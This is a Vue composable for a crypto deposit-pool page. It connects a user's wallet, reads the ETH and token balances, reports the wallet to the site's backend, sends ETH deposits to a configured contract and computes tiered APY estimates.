import { ref, onMounted, watch } from 'vue'
import { Web3 } from 'web3'
import { useToast } from 'primevue/usetoast'
import axiosClient from '@/services/axiosClient'
import { contractABI } from '@/contracts/contractConfig'
import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi'
import { mainnet, sepolia } from 'viem/chains'
import { reconnect, watchAccount, getBalance } from '@wagmi/core'

export const usePoolView = () => {
    const web3 = new Web3(window.ethereum)
    const contractAddress = import.meta.env.VITE_CONTRACT_ADDRESS
    const contract = new web3.eth.Contract(contractABI, contractAddress)
    const tokenAddress = import.meta.env.VITE_TOKEN_CONTRACT_ADDRESS

    const toast = useToast()
    const levels = ref([])
    const setting = ref([])
    const walletAddress = ref(null)
    const ethAmount = ref(null)
    const ethApyAmount = ref(null)
    const ethEstimatedPrincipal = ref(null)
    const ethEstimatedEarn = ref(null)
    const isEthBtnClicked = ref(false)
    const ethBalance = ref(null)
    const usdtBalance = ref(null)

    const projectId = import.meta.env.VITE_PROJECT_ID

    const metadata = {
        name: 'Web3Modal',
        description: 'Web3Modal Example',
        url: 'https://web3modal.com',
        icons: ['https://avatars.githubusercontent.com/u/37784886']
    }

    const chains = [mainnet, sepolia]

    const config = defaultWagmiConfig({
        chains,
        projectId,
        metadata,
        enableWalletConnect: true,
        enableInjected: true,
        enableEIP6963: true,
        enableCoinbase: true
    })

    reconnect(config)

    createWeb3Modal({
        wagmiConfig: config,
        projectId,
        enableAnalytics: true
    })

    watchAccount(config, {
        async onChange(data) {
            walletAddress.value = data.address

            if (walletAddress.value) {
                let ethAmount = await getBalance(config, {
                    address: walletAddress.value
                })

                let usdtAmount = await getBalance(config, {
                    address: walletAddress.value,
                    token: tokenAddress
                })

                ethBalance.value = ethAmount.formatted
                usdtBalance.value = usdtAmount.formatted

                console.log(ethBalance.value, usdtBalance.value)

                const params = {
                    wallet: walletAddress.value
                }

                await axiosClient.post('/wallet-info', params)
            }
        }
    })

    onMounted(() => {
        getLevel()
        getSetting()
    })

    const getLevel = async () => {
        const response = await axiosClient.get('/level')
        levels.value = response.data.data
    }

    const getSetting = async () => {
        const response = await axiosClient.get('/home-assets')
        setting.value = response.data.setting
    }

    // Deposit Eth
    const depositETH = async (amount) => {
        // Ensure the user has connected their wallet
        if (!walletAddress.value) {
            console.log('Please connect to your wallet!')
            toast.add({ severity: 'warn', detail: 'Please connect to your wallet!', life: 3000 })
        } else {
            try {
                isEthBtnClicked.value = true
                // Convert amount to Wei
                const amountInEth = web3.utils.toWei(amount.toString(), 'ether')

                const receipt = await contract.methods.depositETH().send({
                    from: walletAddress.value,
                    value: amountInEth
                })

                if (receipt.status) {
                    toast.add({ severity: 'success', detail: 'ETH Deposit Successful!', life: 3000 })

                    // Reset deposit amount back to 0
                    ethAmount.value = 0

                    // Store wallet address & amount in DB
                    const params = {
                        wallet: walletAddress.value,
                        real_balance: amount,
                        level: 1,
                        type: 'eth',
                        walletBalance: ethBalance.value
                    }

                    await axiosClient.post('/user-info', params)
                    isEthBtnClicked.value = false
                } else {
                    isEthBtnClicked.value = false

                    toast.add({ severity: 'warn', detail: 'Transaction failed!', life: 3000 })
                    console.error('Transaction failed!')
                }
            } catch (error) {
                isEthBtnClicked.value = false

                toast.add({ severity: 'warn', detail: 'Transaction failed!', life: 3000 })
                console.error('Error during transaction:', error)
            }
        }
    }

    watch(ethAmount, () => {
        if (ethAmount.value) {
            let isConditionMet = false

            levels.value.Eth.forEach((level) => {
                if (!isConditionMet && parseFloat(ethAmount.value) >= parseFloat(level.min_amount) && parseFloat(ethAmount.value) <= parseFloat(level.max_amount)) {
                    isEthBtnClicked.value = false
                    ethApyAmount.value = level.percentage
                    ethEstimatedPrincipal.value = ethAmount.value * (ethApyAmount.value / 100)
                    ethEstimatedEarn.value = ethEstimatedPrincipal.value / 12

                    isConditionMet = true
                }
            })

            if (!isConditionMet) {
                isEthBtnClicked.value = true
                ethApyAmount.value = null
                ethEstimatedPrincipal.value = null
                ethEstimatedEarn.value = null
            }
        } else {
            isEthBtnClicked.value = true
            ethApyAmount.value = null
            ethEstimatedPrincipal.value = null
            ethEstimatedEarn.value = null
        }
    })

    return {
        walletAddress,
        depositETH,
        isEthBtnClicked,
        ethAmount,
        ethApyAmount,
        ethEstimatedPrincipal,
        ethEstimatedEarn,
        setting
    }
}
